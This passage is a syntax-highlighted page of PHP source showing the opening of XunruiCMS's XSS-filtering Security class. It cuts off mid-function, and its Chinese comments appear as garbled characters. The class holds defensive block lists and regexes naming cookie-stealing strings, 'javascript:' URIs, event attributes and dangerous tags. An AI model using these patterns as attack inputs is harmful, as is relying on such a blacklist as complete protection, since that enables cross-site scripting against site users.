</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span><span class="lnt">219
</span><span class="lnt">220
</span><span class="lnt">221
</span><span class="lnt">222
</span><span class="lnt">223
</span><span class="lnt">224
</span><span class="lnt">225
</span><span class="lnt">226
</span><span class="lnt">227
</span><span class="lnt">228
</span><span class="lnt">229
</span><span class="lnt">230
</span><span class="lnt">231
</span><span class="lnt">232
</span><span class="lnt">233
</span><span class="lnt">234
</span><span class="lnt">235
</span><span class="lnt">236
</span><span class="lnt">237
</span><span class="lnt">238
</span><span class="lnt">239
</span><span class="lnt">240
</span><span class="lnt">241
</span><span class="lnt">242
</span><span class="lnt">243
</span><span class="lnt">244
</span><span class="lnt">245
</span><span class="lnt">246
</span><span class="lnt">247
</span><span class="lnt">248
</span><span class="lnt">249
</span><span class="lnt">250
</span><span class="lnt">251
</span><span class="lnt">252
</span><span class="lnt">253
</span><span class="lnt">254
</span><span class="lnt">255
</span><span class="lnt">256
</span><span class="lnt">257
</span><span class="lnt">258
</span><span class="lnt">259
</span><span class="lnt">260
</span><span class="lnt">261
</span><span class="lnt">262
</span><span class="lnt">263
</span><span class="lnt">264
</span><span class="lnt">265
</span><span class="lnt">266
</span><span class="lnt">267
</span><span class="lnt">268
</span><span class="lnt">269
</span><span class="lnt">270
</span><span class="lnt">271
</span><span class="lnt">272
</span><span class="lnt">273
</span><span class="lnt">274
</span><span class="lnt">275
</span><span class="lnt">276
</span><span class="lnt">277
</span><span class="lnt">278
</span><span class="lnt">279
</span><span class="lnt">280
</span><span class="lnt">281
</span><span class="lnt">282
</span><span class="lnt">283
</span><span class="lnt">284
</span><span class="lnt">285
</span><span class="lnt">286
</span><span class="lnt">287
</span><span class="lnt">288
</span><span class="lnt">289
</span><span class="lnt">290
</span><span class="lnt">291
</span><span class="lnt">292
</span><span class="lnt">293
</span><span class="lnt">294
</span><span class="lnt">295
</span><span class="lnt">296
</span><span class="lnt">297
</span><span class="lnt">298
</span><span class="lnt">299
</span><span class="lnt">300
</span><span class="lnt">301
</span><span class="lnt">302
</span><span class="lnt">303
</span><span class="lnt">304
</span><span class="lnt">305
</span><span class="lnt">306
</span><span class="lnt">307
</span><span class="lnt">308
</span><span class="lnt">309
</span><span class="lnt">310
</span><span class="lnt">311
</span><span class="lnt">312
</span><span class="lnt">313
</span><span class="lnt">314
</span><span class="lnt">315
</span><span class="lnt">316
</span><span class="lnt">317
</span><span class="lnt">318
</span><span class="lnt">319
</span><span class="lnt">320
</span><span class="lnt">321
</span><span class="lnt">322
</span><span class="lnt">323
</span><span class="lnt">324
</span><span class="lnt">325
</span><span class="lnt">326
</span><span class="lnt">327
</span><span class="lnt">328
</span><span class="lnt">329
</span><span class="lnt">330
</span><span class="lnt">331
</span><span class="lnt">332
</span><span class="lnt">333
</span><span class="lnt">334
</span><span class="lnt">335
</span><span class="lnt">336
</span><span class="lnt">337
</span><span class="lnt">338
</span><span class="lnt">339
</span><span class="lnt">340
</span><span class="lnt">341
</span><span class="lnt">342
</span><span class="lnt">343
</span><span class="lnt">344
</span><span class="lnt">345
</span><span class="lnt">346
</span><span class="lnt">347
</span><span class="lnt">348
</span><span class="lnt">349
</span><span class="lnt">350
</span><span class="lnt">351
</span><span class="lnt">352
</span><span class="lnt">353
</span><span class="lnt">354
</span><span class="lnt">355
</span><span class="lnt">356
</span><span class="lnt">357
</span><span class="lnt">358
</span><span class="lnt">359
</span><span class="lnt">360
</span><span class="lnt">361
</span><span class="lnt">362
</span><span class="lnt">363
</span><span class="lnt">364
</span><span class="lnt">365
</span><span class="lnt">366
</span><span class="lnt">367
</span><span class="lnt">368
</span><span class="lnt">369
</span><span class="lnt">370
</span><span class="lnt">371
</span><span class="lnt">372
</span><span class="lnt">373
</span><span class="lnt">374
</span><span class="lnt">375
</span><span class="lnt">376
</span><span class="lnt">377
</span><span class="lnt">378
</span><span class="lnt">379
</span><span class="lnt">380
</span><span class="lnt">381
</span><span class="lnt">382
</span><span class="lnt">383
</span><span class="lnt">384
</span><span class="lnt">385
</span><span class="lnt">386
</span><span class="lnt">387
</span><span class="lnt">388
</span><span class="lnt">389
</span><span class="lnt">390
</span><span class="lnt">391
</span><span class="lnt">392
</span><span class="lnt">393
</span><span class="lnt">394
</span><span class="lnt">395
</span><span class="lnt">396
</span><span class="lnt">397
</span><span class="lnt">398
</span><span class="lnt">399
</span><span class="lnt">400
</span><span class="lnt">401
</span><span class="lnt">402
</span><span class="lnt">403
</span><span class="lnt">404
</span><span class="lnt">405
</span><span class="lnt">406
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">namespace</span> <span class="nx">Phpcmf\Library</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="sd">/**
</span></span></span><span class="line"><span class="cl"><span class="sd"> * {{www.xunruicms.com}}
</span></span></span><span class="line"><span class="cl"><span class="sd"> * {{ËøÖÁùøÂÜÖÂÆπÁÆ°ÁêÜÊ°ÜÊû∂Á≥ªÁªü}}
</span></span></span><span class="line"><span class="cl"><span class="sd"> * Êú¨Êñá‰ª∂ÊòØÊ°ÜÊû∂Á≥ªÁªüÊñá‰ª∂Ôºå‰∫åÊ¨°ÂºÄÂèëÊó∂‰∏çÂèØ‰ª•‰øÆÊîπÊú¨Êñá‰ª∂ÔºåÂèØ‰ª•ÈÄöËøáÁªßÊâøÁ±ªÊñπÊ≥ïÊù•ÈáçÂÜôÊ≠§Êñá‰ª∂
</span></span></span><span class="line"><span class="cl"><span class="sd"> **/</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="sd">/**
</span></span></span><span class="line"><span class="cl"><span class="sd"> * ÂÆâÂÖ®ËøáÊª§
</span></span></span><span class="line"><span class="cl"><span class="sd"> */</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Security</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="sd">/**
</span></span></span><span class="line"><span class="cl"><span class="sd">	 * List of sanitize filename strings
</span></span></span><span class="line"><span class="cl"><span class="sd">	 *
</span></span></span><span class="line"><span class="cl"><span class="sd">	 * @var	array
</span></span></span><span class="line"><span class="cl"><span class="sd">	 */</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$filename_bad_chars</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">		<span class="s1">&#39;../&#39;</span><span class="p">,</span> <span class="s1">&#39;&lt;!--&#39;</span><span class="p">,</span> <span class="s1">&#39;--&gt;&#39;</span><span class="p">,</span> <span class="s1">&#39;&lt;&#39;</span><span class="p">,</span> <span class="s1">&#39;&gt;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="s2">&#34;&#39;&#34;</span><span class="p">,</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">,</span> <span class="s1">&#39;&amp;&#39;</span><span class="p">,</span> <span class="s1">&#39;$&#39;</span><span class="p">,</span> <span class="s1">&#39;#&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="s1">&#39;{&#39;</span><span class="p">,</span> <span class="s1">&#39;}&#39;</span><span class="p">,</span> <span class="s1">&#39;[&#39;</span><span class="p">,</span> <span class="s1">&#39;]&#39;</span><span class="p">,</span> <span class="s1">&#39;=&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="s1">&#39;;&#39;</span><span class="p">,</span> <span class="s1">&#39;?&#39;</span><span class="p">,</span> <span class="s1">&#39;%20&#39;</span><span class="p">,</span> <span class="s1">&#39;%22&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="s1">&#39;%3c&#39;</span><span class="p">,</span>		<span class="c1">// &lt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="s1">&#39;%253c&#39;</span><span class="p">,</span>	<span class="c1">// &lt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="s1">&#39;%3e&#39;</span><span class="p">,</span>		<span class="c1">// &gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="s1">&#39;%0e&#39;</span><span class="p">,</span>		<span class="c1">// &gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="s1">&#39;%28&#39;</span><span class="p">,</span>		<span class="c1">// (
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="s1">&#39;%29&#39;</span><span class="p">,</span>		<span class="c1">// )
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="s1">&#39;%2528&#39;</span><span class="p">,</span>	<span class="c1">// (
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="s1">&#39;%26&#39;</span><span class="p">,</span>		<span class="c1">// &amp;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="s1">&#39;%24&#39;</span><span class="p">,</span>		<span class="c1">// $
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="s1">&#39;%3f&#39;</span><span class="p">,</span>		<span class="c1">// ?
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="s1">&#39;%3b&#39;</span><span class="p">,</span>		<span class="c1">// ;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="s1">&#39;%3d&#39;</span>		<span class="c1">// =
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$naughty_tags</span>  <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$evil_attributes</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="sd">/**
</span></span></span><span class="line"><span class="cl"><span class="sd">	 * Character set
</span></span></span><span class="line"><span class="cl"><span class="sd">	 *
</span></span></span><span class="line"><span class="cl"><span class="sd">	 * Will be overridden by the constructor.
</span></span></span><span class="line"><span class="cl"><span class="sd">	 *
</span></span></span><span class="line"><span class="cl"><span class="sd">	 * @var	string
</span></span></span><span class="line"><span class="cl"><span class="sd">	 */</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$charset</span> <span class="o">=</span> <span class="s1">&#39;UTF-8&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="sd">/**
</span></span></span><span class="line"><span class="cl"><span class="sd">	 * XSS Hash
</span></span></span><span class="line"><span class="cl"><span class="sd">	 *
</span></span></span><span class="line"><span class="cl"><span class="sd">	 * Random Hash for protecting URLs.
</span></span></span><span class="line"><span class="cl"><span class="sd">	 *
</span></span></span><span class="line"><span class="cl"><span class="sd">	 * @var	string
</span></span></span><span class="line"><span class="cl"><span class="sd">	 */</span>
</span></span><span class="line"><span class="cl">	<span class="k">protected</span> <span class="nv">$_xss_hash</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="sd">/**
</span></span></span><span class="line"><span class="cl"><span class="sd">	 * List of never allowed strings
</span></span></span><span class="line"><span class="cl"><span class="sd">	 *
</span></span></span><span class="line"><span class="cl"><span class="sd">	 * @var	array
</span></span></span><span class="line"><span class="cl"><span class="sd">	 */</span>
</span></span><span class="line"><span class="cl">	<span class="k">protected</span> <span class="nv">$_never_allowed_str</span> <span class="o">=</span>	<span class="p">[</span>
</span></span><span class="line"><span class="cl">		<span class="s1">&#39;document.cookie&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;[xss_clean]&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="s1">&#39;(document).cookie&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;[xss_clean]&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="s1">&#39;document.write&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;[xss_clean]&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="s1">&#39;(document).write&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;[xss_clean]&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="s1">&#39;.parentNode&#39;</span>     <span class="o">=&gt;</span> <span class="s1">&#39;[xss_clean]&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="s1">&#39;.innerHTML&#39;</span>      <span class="o">=&gt;</span> <span class="s1">&#39;[xss_clean]&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="s1">&#39;-moz-binding&#39;</span>    <span class="o">=&gt;</span> <span class="s1">&#39;[xss_clean]&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="s1">&#39;&lt;!--&#39;</span>            <span class="o">=&gt;</span> <span class="s1">&#39;&amp;lt;!--&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="s1">&#39;--&gt;&#39;</span>             <span class="o">=&gt;</span> <span class="s1">&#39;--&amp;gt;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="s1">&#39;&lt;![CDATA[&#39;</span>       <span class="o">=&gt;</span> <span class="s1">&#39;&amp;lt;![CDATA[&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="s1">&#39;&lt;comment&gt;&#39;</span>	  <span class="o">=&gt;</span> <span class="s1">&#39;&amp;lt;comment&amp;gt;&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="s1">&#39;&lt;%&#39;</span>              <span class="o">=&gt;</span> <span class="s1">&#39;&amp;lt;&amp;#37;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1">// ÊõøÊç¢ÂâçÁöÑÂ§ÑÁêÜ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">protected</span> <span class="nv">$_never_call_str</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;&amp;quot;javascript:&#39;</span>    <span class="o">=&gt;</span> <span class="s1">&#39;&amp;quot;javascript_xunruicms:&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="sd">/**
</span></span></span><span class="line"><span class="cl"><span class="sd">	 * List of never allowed regex replacements
</span></span></span><span class="line"><span class="cl"><span class="sd">	 *
</span></span></span><span class="line"><span class="cl"><span class="sd">	 * @var	array
</span></span></span><span class="line"><span class="cl"><span class="sd">	 */</span>
</span></span><span class="line"><span class="cl">	<span class="k">protected</span> <span class="nv">$_never_allowed_regex</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">		<span class="s1">&#39;javascript\s*:&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="s1">&#39;(\(?document\)?|\(?window\)?(\.document)?)\.(location|on\w*)&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="s1">&#39;expression\s*(\(|&amp;\#40;)&#39;</span><span class="p">,</span> <span class="c1">// CSS and IE
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="s1">&#39;vbscript\s*:&#39;</span><span class="p">,</span> <span class="c1">// IE, surprise!
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="s1">&#39;wscript\s*:&#39;</span><span class="p">,</span> <span class="c1">// IE
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="s1">&#39;jscript\s*:&#39;</span><span class="p">,</span> <span class="c1">// IE
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="s1">&#39;vbs\s*:&#39;</span><span class="p">,</span> <span class="c1">// IE
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="s1">&#39;Redirect\s+30\d&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="s2">&#34;([</span><span class="se">\&#34;</span><span class="s2">&#39;])+data\s*:[^</span><span class="se">\\</span><span class="s2">1]*?base64[^</span><span class="se">\\</span><span class="s2">1]*?,[^</span><span class="se">\\</span><span class="s2">1]*?</span><span class="se">\\</span><span class="s2">1?&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="c1">// --------------------------------------------------------------------
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">	<span class="sd">/**
</span></span></span><span class="line"><span class="cl"><span class="sd">	 * XSS Clean
</span></span></span><span class="line"><span class="cl"><span class="sd">	 *
</span></span></span><span class="line"><span class="cl"><span class="sd">	 * Sanitizes data so that Cross Site Scripting Hacks can be
</span></span></span><span class="line"><span class="cl"><span class="sd">	 * prevented.  This method does a fair amount of work but
</span></span></span><span class="line"><span class="cl"><span class="sd">	 * it is extremely thorough, designed to prevent even the
</span></span></span><span class="line"><span class="cl"><span class="sd">	 * most obscure XSS attempts.  Nothing is ever 100% foolproof,
</span></span></span><span class="line"><span class="cl"><span class="sd">	 * of course, but I haven&#39;t been able to get anything passed
</span></span></span><span class="line"><span class="cl"><span class="sd">	 * the filter.
</span></span></span><span class="line"><span class="cl"><span class="sd">	 *
</span></span></span><span class="line"><span class="cl"><span class="sd">	 * Note: Should only be used to deal with data upon submission.
</span></span></span><span class="line"><span class="cl"><span class="sd">	 *	 It&#39;s not something that should be used for general
</span></span></span><span class="line"><span class="cl"><span class="sd">	 *	 runtime processing.
</span></span></span><span class="line"><span class="cl"><span class="sd">	 *
</span></span></span><span class="line"><span class="cl"><span class="sd">	 * @link	http://channel.bitflux.ch/wiki/XSS_Prevention
</span></span></span><span class="line"><span class="cl"><span class="sd">	 * 		Based in part on some code and ideas from Bitflux.
</span></span></span><span class="line"><span class="cl"><span class="sd">	 *
</span></span></span><span class="line"><span class="cl"><span class="sd">	 * @link	http://ha.ckers.org/xss.html
</span></span></span><span class="line"><span class="cl"><span class="sd">	 * 		To help develop this script I used this great list of
</span></span></span><span class="line"><span class="cl"><span class="sd">	 *		vulnerabilities along with a few other hacks I&#39;ve
</span></span></span><span class="line"><span class="cl"><span class="sd">	 *		harvested from examining vulnerabilities in other programs.
</span></span></span><span class="line"><span class="cl"><span class="sd">	 *
</span></span></span><span class="line"><span class="cl"><span class="sd">	 * @param	string|string[]	$str		Input data
</span></span></span><span class="line"><span class="cl"><span class="sd">	 * @param 	bool		$is_image	    ‰∏•Ê†ºÁöÑËøáÊª§
</span></span></span><span class="line"><span class="cl"><span class="sd">	 * @return	string
</span></span></span><span class="line"><span class="cl"><span class="sd">	 */</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="k">function</span> <span class="nf">xss_clean</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nv">$is_image</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$str</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="nv">$str</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="o">!</span><span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	        <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="c1">// Is the string an array?
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="k">if</span> <span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$str</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">		<span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="k">foreach</span> <span class="p">(</span><span class="nv">$str</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="o">&amp;</span><span class="nv">$value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="p">{</span>
</span></span><span class="line"><span class="cl">				<span class="nv">$str</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">xss_clean</span><span class="p">(</span><span class="nv">$value</span><span class="p">,</span> <span class="nv">$is_image</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">			<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="nv">$str</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">json_encode</span><span class="p">(</span> <span class="nv">$str</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s1">&#39;[xss_clean]&#39;</span><span class="p">;</span> <span class="c1">// Âà§Êñ≠Âê´Êúâ‰π±Á†ÅÁõ¥Êé•ËøáÊª§‰∏∫Á©∫
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">naughty_tags</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;alert&#39;</span><span class="p">,</span> <span class="s1">&#39;area&#39;</span><span class="p">,</span> <span class="s1">&#39;prompt&#39;</span><span class="p">,</span> <span class="s1">&#39;confirm&#39;</span><span class="p">,</span> <span class="s1">&#39;applet&#39;</span><span class="p">,</span> <span class="s1">&#39;audio&#39;</span><span class="p">,</span> <span class="s1">&#39;basefont&#39;</span><span class="p">,</span> <span class="s1">&#39;base&#39;</span><span class="p">,</span> <span class="s1">&#39;behavior&#39;</span><span class="p">,</span> <span class="s1">&#39;bgsound&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;blink&#39;</span><span class="p">,</span> <span class="s1">&#39;body&#39;</span><span class="p">,</span>  <span class="s1">&#39;expression&#39;</span><span class="p">,</span> <span class="s1">&#39;form&#39;</span><span class="p">,</span> <span class="s1">&#39;frameset&#39;</span><span class="p">,</span> <span class="s1">&#39;frame&#39;</span><span class="p">,</span> <span class="s1">&#39;head&#39;</span><span class="p">,</span> <span class="s1">&#39;html&#39;</span><span class="p">,</span> <span class="s1">&#39;ilayer&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;input&#39;</span><span class="p">,</span> <span class="s1">&#39;button&#39;</span><span class="p">,</span> <span class="s1">&#39;select&#39;</span><span class="p">,</span> <span class="s1">&#39;isindex&#39;</span><span class="p">,</span> <span class="s1">&#39;layer&#39;</span><span class="p">,</span> <span class="s1">&#39;link&#39;</span><span class="p">,</span> <span class="s1">&#39;meta&#39;</span><span class="p">,</span> <span class="s1">&#39;keygen&#39;</span><span class="p">,</span> <span class="s1">&#39;object&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;plaintext&#39;</span><span class="p">,</span> <span class="s1">&#39;script&#39;</span><span class="p">,</span> <span class="s1">&#39;textarea&#39;</span><span class="p">,</span> <span class="s1">&#39;title&#39;</span><span class="p">,</span> <span class="s1">&#39;math&#39;</span><span class="p">,</span>  <span class="s1">&#39;svg&#39;</span><span class="p">,</span> <span class="s1">&#39;xml&#39;</span><span class="p">,</span> <span class="s1">&#39;xss&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//&#39;iframe&#39;, &#39;video&#39;, &#39;embed&#39;, &#39;style&#39;  //ÊéíÈô§ËøáÊª§
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">        <span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">evil_attributes</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">            <span class="s1">&#39;on\w+&#39;</span><span class="p">,</span> <span class="s1">&#39;xmlns&#39;</span><span class="p">,</span> <span class="s1">&#39;formaction&#39;</span><span class="p">,</span> <span class="s1">&#39;form&#39;</span><span class="p">,</span> <span class="s1">&#39;xlink:href&#39;</span><span class="p">,</span> <span class="s1">&#39;FSCommand&#39;</span><span class="p">,</span> <span class="s1">&#39;seekSegmentTime&#39;</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//  ,&#39;style&#39; ÊéíÈô§ËøáÊª§
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">        <span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$is_image</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="c1">// ‰∏•Ê†ºÁöÑËøáÊª§
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">naughty_tags</span> <span class="o">=</span> <span class="nx">array_merge</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">naughty_tags</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;iframe&#39;</span><span class="p">,</span> <span class="s1">&#39;video&#39;</span><span class="p">,</span> <span class="s1">&#39;embed&#39;</span><span class="p">,</span> <span class="s1">&#39;style&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">evil_attributes</span> <span class="o">=</span> <span class="nx">array_merge</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">evil_attributes</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;style&#39;</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">            <span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">             * URL Decode
</span></span></span><span class="line"><span class="cl"><span class="cm">             *
</span></span></span><span class="line"><span class="cl"><span class="cm">             * Just in case stuff like this is submitted:
</span></span></span><span class="line"><span class="cl"><span class="cm">             *
</span></span></span><span class="line"><span class="cl"><span class="cm">             * &lt;a href=&#34;http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D&#34;&gt;Google&lt;/a&gt;
</span></span></span><span class="line"><span class="cl"><span class="cm">             *
</span></span></span><span class="line"><span class="cl"><span class="cm">             * Note: Use rawurldecode() so it does not remove plus signs
</span></span></span><span class="line"><span class="cl"><span class="cm">             * */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">stripos</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="s1">&#39;%&#39;</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">do</span>
</span></span><span class="line"><span class="cl">                <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nv">$oldstr</span> <span class="o">=</span> <span class="nv">$str</span><span class="p">;</span>
